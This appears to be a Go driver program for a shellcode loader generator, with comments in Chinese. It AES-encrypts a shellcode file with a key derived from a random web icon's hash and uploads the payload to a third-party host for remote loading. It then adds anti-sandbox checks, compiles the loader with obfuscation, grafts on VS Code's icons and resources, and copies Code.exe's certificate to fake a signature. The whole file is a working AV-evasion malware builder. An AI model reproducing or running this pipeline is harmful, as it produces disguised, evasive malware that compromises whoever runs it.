package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/dynamic"
	"variant/encoder"
	"variant/gores"
	"variant/log"
	"variant/network"
	"variant/rand"
	"variant/render"
)

func main() {
	// 反沙箱模块
	sandbox := render.SandBox{
		Methods: []string{
			"sandbox.GetDesktopFiles",
			"sandbox.BootTimeGetTime",
		}}

	// 加载器模块
	load := render.Loader{
		Import: "variant/loader",
		Method: "loader.EnumerateLoadedModulesLoad",
	}

	// 获取随机网络资源的 SHA256 用于 ShellCode 加密
	hexUrl := dynamic.RandomICO()
	sha256Value := dynamic.CalcSHA256(hexUrl)

	// 配置远程加载参数
	d := render.Dynamic{
		Import:         "variant/dynamic",
		DynamicMethod:  "dynamic.CalcSHA256",
		DecryptDynamic: "crypto.AesBase32Decrypt",
		DynamicUrl:     hexUrl,
		MainDynamic:    rand.RStrings(),
		HexValue:       rand.RStrings(),
		KeyName:        rand.RStrings(),
		KeyStart:       0,
		KeyEnd:         16,
		IVName:         rand.RStrings(),
		IVStart:        0,
		IVEnd:          16,
	}

	// 设置加密参数
	params := encoder.Payload{
		PlainText: "output/calc.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       dynamic.AesKey(sha256Value, d.KeyStart, d.KeyEnd),
		IV:        dynamic.AesKey(sha256Value, d.IVStart, d.IVEnd),
	}
	// 加密之后的 shellcode
	payload, err := params.SetKeyIV(crypto.AesBase32Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}
	_ = params.WriteStrings(payload)

	// 上传远程加载的Payload到第三方
	fi := network.FileIO{
		Path: "output",
		Src:  params.FileName,
	}

	// 设置远程加载渲染模板
	r := render.Remote{
		Import: "variant/network",
		Method: "network.FileIORead",
		Url:    fi.FileIOUpload(),
	}

	// 定义模板渲染数据
	data := render.Data{
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Loader:     load,
		Dynamic:    d,
		Remote:     r,
		SandBox:    sandbox,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v6/Base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = tOpts.TmplRender()
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: false,
		CompilePath: "output",
		BuildMode:   "pie",
		Literals:    true,
		GSeed:       true,
		Tiny:        true,
		GDebug:      false,
	}

	// 编译
	if err = cOpts.GoCompile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	winres := gores.GoWinRes{
		CompilePath: "output",          // 指定编译目录
		ExtractFile: "Code.exe",        // 指定提取资源文件的对象
		ExtractDir:  "",                // 指定提取资源文件后输出的路径
		PatchFile:   cOpts.ExeFileName, // 指定使用 Patch 添加资源文件的对象
	}

	// 提取 vscode 所有的资源文件
	err = winres.Extract()
	if err != nil {
		log.Fatal(err)
	}

	// 使用 Patch 添加资源文件到编译后的程序
	err = winres.HandleWinRes()
	if err != nil {
		log.Fatal(err)
	}

	// 伪造证书配置
	ct := build.CertThief{
		SignDir: "output",
		SrcFile: cOpts.ExeFileName,
		DstFile: "Code.exe",
		Signed:  fmt.Sprintf("signed_%s", cOpts.ExeFileName),
		DstCert: "Code.der",
	}

	// 保存证书
	err = ct.CertSaver()
	if err != nil {
		log.Fatal(err)
	}

	// 利用EXE进行签名伪造
	err = ct.ExeThief()
	if err != nil {
		log.Fatal(err)
	}
}
